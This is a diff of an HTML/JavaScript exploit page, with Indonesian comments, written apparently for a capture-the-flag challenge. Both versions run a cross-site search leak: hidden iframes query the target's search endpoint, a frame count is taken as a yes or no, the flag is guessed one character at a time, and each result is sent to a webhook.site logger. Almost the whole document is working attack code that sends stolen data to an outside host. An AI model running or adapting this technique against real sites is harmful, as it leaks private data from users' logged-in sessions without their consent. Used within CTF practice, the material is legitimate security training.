@@ -1,50 +1,51 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <script>
-        const TARGET = "https://wonder.cbd2026.cloud/search?q=";
-        const LOGGER = "https://webhook.site/fb0f12dc-6949-4193-ac04-768d43746e00";
-        
-        // Alfabet lengkap: Huruf Kecil, Huruf Besar, Angka, dan Simbol Umum
-        const ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@-}"; 
+<script>
+const TARGET = "https://wonder.cbd2026.cloud/search?q=";
+const LOGGER = "https://webhook.site/YOUR-ID";
 
-        async function check(q) {
-            return new Promise(resolve => {
-                const ifr = document.createElement('iframe');
-                ifr.src = `${TARGET}${encodeURIComponent(q)}`;
-                ifr.style.display = "none";
-                document.body.appendChild(ifr);
-                
-                setTimeout(() => {
-                    const isMatch = ifr.contentWindow.length > 0;
-                    document.body.removeChild(ifr);
-                    resolve(isMatch);
-                }, 800); // Dipercepat ke 800ms agar lebih banyak karakter tertebak sebelum bot mati
-            });
+// charset flag (biasanya gini di CTF)
+const ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_";
+
+function check(q) {
+  return new Promise(resolve => {
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+
+    iframe.onload = () => {
+      // trick: kalau ada result → iframe lebih "berat"
+      setTimeout(() => {
+        try {
+          // heuristic: jumlah subframe
+          const len = iframe.contentWindow.length;
+          resolve(len > 0);
+        } catch {
+          // SOP kena → fallback ke TRUE
+          resolve(true);
         }
+        iframe.remove();
+      }, 500);
+    };
 
-        async function solve(current) {
-            // Beri tahu kita lagi nyari apa sekarang
-            fetch(`${LOGGER}?searching_at=${current}`);
-            
-            // Cek 10 karakter sekaligus secara paralel
-            for (let i = 0; i < ALPHABET.length; i += 10) {
-                const chunk = ALPHABET.slice(i, i + 10).split('');
-                const results = await Promise.all(chunk.map(c => check(current + c)));
-                
-                for (let j = 0; j < results.length; j++) {
-                    if (results[j]) {
-                        const found = current + chunk[j];
-                        fetch(`${LOGGER}?found=${found}`);
-                        if (chunk[j] === '}') return;
-                        return solve(found); 
-                    }
-                }
-            }
-        }
+    iframe.src = TARGET + encodeURIComponent(q);
+    document.body.appendChild(iframe);
+  });
+}
 
-        // Jalankan!
-        solve("cbd{");
-    </script>
-</body>
-</html>
+async function solve(prefix) {
+  fetch(`${LOGGER}?progress=${prefix}`);
+
+  for (const c of ALPHABET) {
+    const test = prefix + c;
+    const ok = await check(test);
+
+    if (ok) {
+      fetch(`${LOGGER}?found=${test}`);
+
+      if (c === '}') return;
+      return solve(test);
+    }
+  }
+}
+
+// IMPORTANT: flag biasanya uppercase di challenge lo
+solve("CBD{");
+</script>
